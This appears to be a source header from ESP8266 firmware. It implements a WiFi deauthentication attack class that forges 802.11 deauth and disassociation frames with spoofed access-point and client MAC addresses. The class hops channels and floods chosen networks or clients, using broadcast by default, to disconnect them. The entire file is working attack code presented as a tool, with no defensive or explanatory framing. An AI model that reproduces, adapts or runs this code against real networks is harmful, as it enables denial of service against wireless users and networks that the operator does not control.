#ifndef DEAUTH_H
#define DEAUTH_H

#include <ESP8266WiFi.h>
#include "wifi_structs.h"
#include <vector>

class DeauthAttack {
private:
    bool running = false;
    std::vector<DeauthTarget> targets;
    uint8_t packetsPerBurst = 10;
    bool channelHopping = true;
    uint8_t channel = 1;
    unsigned long lastChannelSwitch = 0;
    unsigned long lastDeauth = 0;
    const unsigned long CHANNEL_HOP_INTERVAL = 500;
    const unsigned long DEAUTH_INTERVAL = 100;
    uint32_t totalPackets = 0;

    // Packet templates
    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                         // Frame Control
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x07, 0x00                          // Reason Code: Class 3 frame received from nonassociated STA
    };

    uint8_t disassocPacket[26] = {
        0xA0, 0x00,                         // Frame Control
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
        0x00, 0x00,                         // Sequence Control
        0x01, 0x00                          // Reason Code: Unspecified
    };

public:
    void begin() {
        WiFi.mode(WIFI_AP_STA);
        wifi_set_opmode(STATION_MODE);
        wifi_promiscuous_enable(0);
    }

    void setPacketsPerBurst(uint8_t packets) {
        packetsPerBurst = constrain(packets, 1, 50);
    }

    void setChannelHopping(bool enabled) {
        channelHopping = enabled;
    }

    void setChannel(uint8_t newChannel) {
        if (newChannel >= 1 && newChannel <= 14) {
            channel = newChannel;
            if (running) {
                wifi_set_channel(channel);
            }
        }
    }

    void setTarget(String bssid, String client = "FF:FF:FF:FF:FF:FF") {
        DeauthTarget target = {bssid, client, 0};
        targets.push_back(target);
    }

    void clearTargets() {
        targets.clear();
        totalPackets = 0;
    }

    void start() {
        if (!targets.empty()) {
            running = true;
            wifi_promiscuous_enable(1);
            wifi_set_channel(channel);
            lastChannelSwitch = millis();
            lastDeauth = millis();
        }
    }

    void stop() {
        running = false;
        wifi_promiscuous_enable(0);
    }

    void update() {
        if (!running) return;

        unsigned long currentTime = millis();

        // Handle channel hopping
        if (channelHopping && currentTime - lastChannelSwitch >= CHANNEL_HOP_INTERVAL) {
            channel = (channel % 13) + 1;
            wifi_set_channel(channel);
            lastChannelSwitch = currentTime;
        }

        // Send deauth packets
        if (currentTime - lastDeauth >= DEAUTH_INTERVAL) {
            for (auto& target : targets) {
                for (int i = 0; i < packetsPerBurst; i++) {
                    sendDeauthPacket(target);
                    sendDisassocPacket(target);
                    target.packets += 2;
                    totalPackets += 2;
                }
            }
            lastDeauth = currentTime;
        }
    }

    String getStatus() {
        String status = "Deauth Attack:\n";
        status += "Targets: " + String(targets.size()) + "\n";
        status += "Channel: " + String(channel) + "\n";
        status += "Packets: " + String(totalPackets);
        return status;
    }

    uint32_t getPacketCount() const { return totalPackets; }
    size_t getTargetCount() const { return targets.size(); }

private:
    void sendDeauthPacket(DeauthTarget& target) {
        uint8_t packet[26];
        memcpy(packet, deauthPacket, 26);
        
        // Set addresses
        uint8_t bssidMac[6];
        uint8_t clientMac[6];
        parseMAC(target.bssid.c_str(), bssidMac);
        parseMAC(target.client.c_str(), clientMac);
        
        // From AP to Client
        memcpy(&packet[4], clientMac, 6);
        memcpy(&packet[10], bssidMac, 6);
        memcpy(&packet[16], bssidMac, 6);
        wifi_send_pkt_freedom(packet, 26, 0);
        
        // From Client to AP
        memcpy(&packet[4], bssidMac, 6);
        memcpy(&packet[10], clientMac, 6);
        memcpy(&packet[16], bssidMac, 6);
        wifi_send_pkt_freedom(packet, 26, 0);
        
        delay(1);
    }

    void sendDisassocPacket(DeauthTarget& target) {
        uint8_t packet[26];
        memcpy(packet, disassocPacket, 26);
        
        uint8_t bssidMac[6];
        uint8_t clientMac[6];
        parseMAC(target.bssid.c_str(), bssidMac);
        parseMAC(target.client.c_str(), clientMac);
        
        memcpy(&packet[4], clientMac, 6);
        memcpy(&packet[10], bssidMac, 6);
        memcpy(&packet[16], bssidMac, 6);
        wifi_send_pkt_freedom(packet, 26, 0);
        
        delay(1);
    }

    void parseMAC(const char* macStr, uint8_t* mac) {
        sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    }
};

#endif 